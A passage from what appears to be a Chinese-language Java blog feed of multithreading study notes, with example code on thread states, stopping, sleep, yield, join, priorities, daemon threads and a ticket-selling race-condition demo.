class="hljs-keyword">this</span>.n = n;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> n;<br><br>    <span class="hljs-comment">//设定暂停所使用的函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//判断需要暂停</span><br>        <span class="hljs-keyword">if</span>(Thread.currentThread().getName().equals(<span class="hljs-string">&quot;A&quot;</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-keyword">this</span>.n);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//输出内容</span><br>        System.out.println(Thread.currentThread().getName());<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        show();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_多线程_3</title>
    <link href="/2021/04/05/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_3/"/>
    <url>/2021/04/05/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_3/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程学习——-3"><a href="#多线程学习——-3" class="headerlink" title="多线程学习—— 3"></a>多线程学习—— 3</h1><h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><p><strong>1. 新建状态(New):</strong> 线程对象被创建后，就进入了新建状态。例如，Thread thread = new Thread()。</p><p><strong>2. 就绪状态(Runnable):</strong> 也被称为“可执行状态”。线程对象被创建后，其它线程调用了该对象的start()方法，从而来启动该线程。例如，thread.start()。处于就绪状态的线程，随时可能被CPU调度执行。</p><p><strong>3. 运行状态(Running):</strong> 线程获取CPU权限进行执行。需要注意的是，线程只能从就绪状态进入到运行状态。</p><p><strong>4. 阻塞状态(Blocked):</strong> 阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：</p><ul><li>(01) 等待阻塞 – 通过调用线程的wait()方法，让线程等待某工作的完成。</li><li>(02) 同步阻塞 – 线程在获取synchronized同步锁失败(因为锁被其它线程所占用)，它会进入同步阻塞状态。</li><li>(03) 其他阻塞 – 通过调用线程的sleep()或join()或发出了I/O请求时，线程会进入到阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。</li></ul><p><strong>5. 死亡状态(Dead):</strong> 线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/09/716271-20170320112245721-1831918220.jpg" alt="多线程状态"></p><p>线程方法</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>setPriority(int newPriority)</td><td>更改线程的优先级</td></tr><tr><td>static void sleep(long millis)</td><td>在指定的毫秒数内让当前正在执行的线程休眠</td></tr><tr><td>void join( )</td><td>等待该线程终止</td></tr><tr><td>static void yield()</td><td>暂停当前正在执行的线程对象，并执行其他线程</td></tr><tr><td>void interrupt()</td><td>中断线程，别用这个方式</td></tr><tr><td>boolean isAlive()</td><td>测试线程是否处于活动状态</td></tr></tbody></table><h2 id="线程停止"><a href="#线程停止" class="headerlink" title="线程停止"></a>线程停止</h2><p>相关代码</p><p>Stop.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-comment">//测试stop</span><br><span class="hljs-comment">//1.建议线程正常停止---&gt;利用次数，不建议死循环</span><br><span class="hljs-comment">//2.建议使用标注位---&gt;设置一个标注位</span><br><span class="hljs-comment">//3.不使用stop或者destroy等过时或者JDK不推荐的方法</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stop</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-comment">//1.设置一个标识位</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> flag=<span class="hljs-keyword">true</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (flag)&#123;<br>            System.out.println(<span class="hljs-string">&quot;run&quot;</span>+i++);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stop</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.flag=<span class="hljs-keyword">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Stop stop=<span class="hljs-keyword">new</span> Stop();<br>        <span class="hljs-keyword">new</span> Thread(stop).start();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;main&quot;</span>+i);<br>            <span class="hljs-keyword">if</span> (i==<span class="hljs-number">99</span>)&#123;<br>                stop.stop();<br>                System.out.println(<span class="hljs-string">&quot;线程停止&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h2><ul><li>sleep (时间)指定当前线程阻塞的毫秒数; .</li><li>sleep存在异常InterruptedException;</li><li>sleep时间达到后线程进入就绪状态;</li><li>sleep可以模拟网络延时，倒计时等。</li><li>每一个对象都有一个锁,</li><li>sleep不会释放锁;</li></ul><p>相关代码</p><p>SleepX.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.多线程;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SleepX</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//打印当前系统的时间</span><br>        Date startTime=<span class="hljs-keyword">new</span> Date(System.currentTimeMillis());<span class="hljs-comment">//获取当前系统的时间</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                System.out.println(<span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;HH:mm:ss&quot;</span>).format(startTime));<br>                startTime=<span class="hljs-keyword">new</span> Date(System.currentTimeMillis());<span class="hljs-comment">//更新当前时间</span><br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h2><ul><li>礼让线程，让当前正在执行的线程暂停，但不阻塞</li><li>将线程从运行状态转为就绪状态</li><li>让cpu重新调度，礼让不-定成功!看CPU心情</li></ul><p>相关代码：</p><p>yield.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试礼让线程</span><br><span class="hljs-comment">//礼让不一定成功</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yeild</span> </span>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        MyYield one=<span class="hljs-keyword">new</span> MyYield();<br>        <span class="hljs-keyword">new</span> Thread( one,<span class="hljs-string">&quot;小明&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread( one,<span class="hljs-string">&quot;小红&quot;</span>).start();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyYield</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;线程开始&quot;</span>);<br>        Thread.yield();<span class="hljs-comment">//线程礼让</span><br>        System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;线程结束&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>若成功就分别开始后分别结束</p><p>若不成功就一个人开始结束后另一个人开始</p><h2 id="线程强制执行-join"><a href="#线程强制执行-join" class="headerlink" title="线程强制执行 join"></a>线程强制执行 join</h2><ul><li>Join合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞</li><li>参考插队</li></ul><p>相关代码</p><p>Join.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试Join方法 参考插队</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Join</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;线程VIP来了&quot;</span>+i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//启动线程</span><br>        Join join1=<span class="hljs-keyword">new</span> Join();<br>        Thread thread= <span class="hljs-keyword">new</span> Thread(join1);<br>        thread.start();<br>        <span class="hljs-comment">//主线程</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)&#123;<br>            <span class="hljs-keyword">if</span>(i==<span class="hljs-number">10</span>)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    thread.join();<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;普通用户&quot;</span>+i);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="线程状态观测"><a href="#线程状态观测" class="headerlink" title="线程状态观测"></a>线程状态观测</h2><p>一个线程可以再给定时间点处于一个状态，这些状态是不反应任何操作系统线程状态的虚拟机状态。</p><p>State.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//观察测试线程状态</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">State</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException </span>&#123;<br>        Thread thread=<span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>           <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)&#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Thread.sleep(<span class="hljs-number">1000</span>);<br>               &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                   e.printStackTrace();<br>               &#125;<br>               System.out.println(<span class="hljs-string">&quot;______&quot;</span>);<br>           &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">//观察状态</span><br>        Thread.State state=thread.getState();<br>        System.out.println(state);<span class="hljs-comment">//NEW</span><br><br>        <span class="hljs-comment">//观察启动后</span><br>        thread.start();<span class="hljs-comment">//启动线程</span><br>        state=thread.getState();<br>        System.out.println(state);<span class="hljs-comment">//Run</span><br><br>        <span class="hljs-keyword">while</span> (state!=Thread.State.TERMINATED)&#123;<span class="hljs-comment">//线程不终止就输出状态</span><br>            Thread.sleep(<span class="hljs-number">1000</span>);<br>            state=thread.getState();<span class="hljs-comment">//更新线程状态</span><br><br>            System.out.println(state);<br>        &#125;<br>        <br>        <span class="hljs-comment">//死亡后的线程无法启动</span><br>        thread.start();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><ul><li><p>Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行。</p></li><li><p>线程的优先级用数字表示，范围从1~10</p><ul><li><p>Thread.MIN_PRIORITY = 1;</p></li><li><p>Thread.MAX_PRIORITY = 10;</p></li><li><p>Thread.NORM_PRIORITY = 5;</p></li></ul></li><li><p>使用以下方式改变或获取优先级</p><ul><li>getPriority() .   setPriority(int xxx)</li></ul></li></ul><p>Priority.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试线程的优先级</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Priority</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//主线程默认优先级</span><br>        System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;--&gt;&quot;</span>+Thread.currentThread().getPriority());<br><br>        MyPriority myPriority=<span class="hljs-keyword">new</span> MyPriority();<br><br>        Thread tmp_1=<span class="hljs-keyword">new</span> Thread(myPriority);<br>        Thread tmp_2=<span class="hljs-keyword">new</span> Thread(myPriority);<br>        Thread tmp_3=<span class="hljs-keyword">new</span> Thread(myPriority);<br>        Thread tmp_4=<span class="hljs-keyword">new</span> Thread(myPriority);<br>        Thread tmp_5=<span class="hljs-keyword">new</span> Thread(myPriority);<br><br>        <span class="hljs-comment">//先设置优先级，再启动</span><br>        tmp_2.setPriority(<span class="hljs-number">1</span>);<br><br>        tmp_4.setPriority(<span class="hljs-number">10</span>);<br><br>        tmp_3.setPriority(<span class="hljs-number">2</span>);<br><br>        tmp_5.setPriority(<span class="hljs-number">8</span>);<br><br>        <br>        tmp_5.start();<br>        tmp_1.start();<br>        tmp_2.start();<br>        tmp_4.start();<br>        tmp_3.start();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPriority</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;--&gt;&quot;</span>+Thread.currentThread().getPriority());<br>    &#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><ul><li>线程分为用户线程和守护线程</li><li>虚拟机必须确保用户线程执行完毕</li><li>虚拟机不用等待守护线程执行完毕</li><li>如,后台记录操作日志,监控内存,</li><li>垃圾回收等待..</li></ul><p>daemon.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-comment">//测试守护线程</span><br><span class="hljs-comment">//上帝守护你</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Daemon</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        God god=<span class="hljs-keyword">new</span> God();<br>        You you=<span class="hljs-keyword">new</span> You();<br><br><br>        Thread thread=<span class="hljs-keyword">new</span> Thread(god);<br>        thread.setDaemon(<span class="hljs-keyword">true</span>);<span class="hljs-comment">//默认是false表示用户线程，正常的线程都是用户线程。。。。。</span><br><br>        thread.start();<span class="hljs-comment">//上帝守护线程启动</span><br><br>        <span class="hljs-keyword">new</span> Thread(you).start();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//God</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">God</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;上帝保佑&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//YOU</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">36500</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;开心的活着&quot;</span>);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;Good Bye!&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_多线程_2</title>
    <link href="/2021/04/05/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_2/"/>
    <url>/2021/04/05/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_2/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程学习——-2"><a href="#多线程学习——-2" class="headerlink" title="多线程学习—— 2"></a>多线程学习—— 2</h1><p>简易的测试</p><p>多线程操作同一对象</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//购买火车票的例子</span><br><br><span class="hljs-comment">//多个线程操作同一个资源的情况下线程不安全</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span>  <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num=<span class="hljs-number">10</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)&#123;<br>            <span class="hljs-keyword">if</span>(num&lt;=<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-comment">//模拟延时</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">20</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;拿到了&quot;</span>+num--+<span class="hljs-string">&quot;票&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Demo2 test=<span class="hljs-keyword">new</span> Demo2();<br>        <span class="hljs-keyword">new</span> Thread(test,<span class="hljs-string">&quot;学生&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(test,<span class="hljs-string">&quot;黄牛&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(test,<span class="hljs-string">&quot;教师&quot;</span>).start();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>模拟龟兔赛跑</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.多线程;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Race</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String winner;<br><br>    <span 